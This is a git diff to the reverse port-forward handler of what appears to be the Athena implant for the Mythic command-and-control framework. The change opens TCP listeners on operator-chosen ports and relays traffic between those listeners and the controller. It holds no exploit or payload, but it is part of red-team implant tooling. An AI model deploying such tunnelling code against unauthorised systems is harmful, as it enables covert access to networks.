@@ -1,31 +1,51 @@
 ﻿using Athena.Commands;
+using Athena.Models.Mythic.Tasks;
 using Athena.Models.Proxy;
 using Athena.Utilities;
-using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Athena.Handler.Proxy
 {
     public class RPortFwdHandler
     {
-        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
+        //Track the number of listeners we have
+        //private ConcurrentDictionary<int, AthenaTcpServer> connections { get; set; }
+        private ConcurrentDictionary<int, AthenaTcpServer> connections { get; set; }
+        private ConcurrentBag<MythicDatagram> messages = new ConcurrentBag<MythicDatagram>();
 
         public RPortFwdHandler()
         {
-            connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
+            connections = new ConcurrentDictionary<int, AthenaTcpServer>();
         }
 
-        /// <summary>
-        /// Add a connection to the tracker dictionary
-        /// </summary>
-        /// <param name="conn">Socks Connection</param>
-        public async Task<bool> AddConnection(AthenaSocksConnection conn)
+        public async Task<bool> StartListener(MythicJob job)
         {
-            return connections.TryAdd(conn.server_id, conn);
+            var parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
+            int port;
+            if (int.TryParse(parameters["lport"], out port))
+            {
+                if (connections.ContainsKey(port))
+                {
+                    return false;
+                }
+
+                AthenaTcpServer ats = new AthenaTcpServer(port);
+                return connections.TryAdd(port, ats);
+
+            }
+            return false;
+        }
+        public async Task<bool> StopListener(int port)
+        {
+            foreach(var conn in connections)
+            {
+                if (conn.Value.Port == port)
+                {
+                    conn.Value.Stop();
+                    return connections.TryRemove(port, out _);
+                }
+            }
+            return false;
         }
 
         /// <summary>
@@ -34,81 +54,16 @@ namespace Athena.Handler.Proxy
         /// <param name="sm">Socks Message</param>
         public async Task HandleMessage(MythicDatagram sm)
         {
-            if (!connections.ContainsKey(sm.server_id)) //Check if this is a new connection
+            foreach(var connection in this.connections)
             {
-                if (!sm.exit)
-                {
-                    await HandleNewConnection(sm); //Add new connection
-                }
-                return;
-            }
-
-            //We already know about this packet, so lets continue
-
-            if (!string.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
-            {
-                if (connections[sm.server_id].IsConnected()) //Check if our connection is alive
-                {
-                    connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
-                }
-            }
-
-            if (sm.exit) //Finally, let's see if exit was set to true
-            {
-                if (connections[sm.server_id].IsConnected())
-                {
-                    connections[sm.server_id].exited = true;
-                    connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
-                }
-                AthenaSocksConnection ac;
-                if (connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
-                {
-                    if (ac.client is not null)
-                    {
-                        ac.client.Dispose();
-                    }
+                if (connection.Value.HasClient(sm.server_id)){
+                    connection.Value.HandleMessage(sm);
+                    break;
                 }
             }
         }
 
-        /// <summary>
-        /// Handle a new connection forwarded from the Mythic server
-        /// </summary>
-        /// <param name="address">IP address</param>
-        /// <param name="sm">Socks Message</param>
-        private async Task HandleNewConnection(MythicDatagram sm)
-        {
-            try
-            {
-                if (string.IsNullOrEmpty(sm.data)) //We got an empty packet even though we should be recieving connect data.
-                {
-                    return;
-                }
-
-                ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet 
-                if (!co.Parse()) //Check if parsing succeeded or not
-                {
-                    ReturnMessageFailure(co.server_id); //Packet parse failed.
-                    return;
-                }
-
-                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect
-                await AddConnection(sc); //Add our connection to the Dictionary;
-
-                sc.client.RunAsync(); //Connect to the endpoint
-            }
-            catch
-            {
-                ReturnMessageFailure(sm.server_id);
-            }
-        }
-
-        public async void ReturnMessageFailure(int id)
-        {
-
-        }
-
-        public void GetSocksMessages()
+        public void GetRportFwdMessages()
         {
             if (connections.Count < 1)
             {
@@ -120,11 +75,7 @@ namespace Athena.Handler.Proxy
                 List<MythicDatagram> returnMessages = conn.Value.GetMessages();
                 foreach (var msg in returnMessages)
                 {
-                    ProxyResponseHandler.AddProxyMessageAsync(DatagramSource.Socks5, msg);
-                    if (msg.exit)
-                    {
-                        connections.TryRemove(msg.server_id, out _);
-                    }
+                    ProxyResponseHandler.AddProxyMessageAsync(DatagramSource.RPortFwd, msg);
                 }
             }
         }
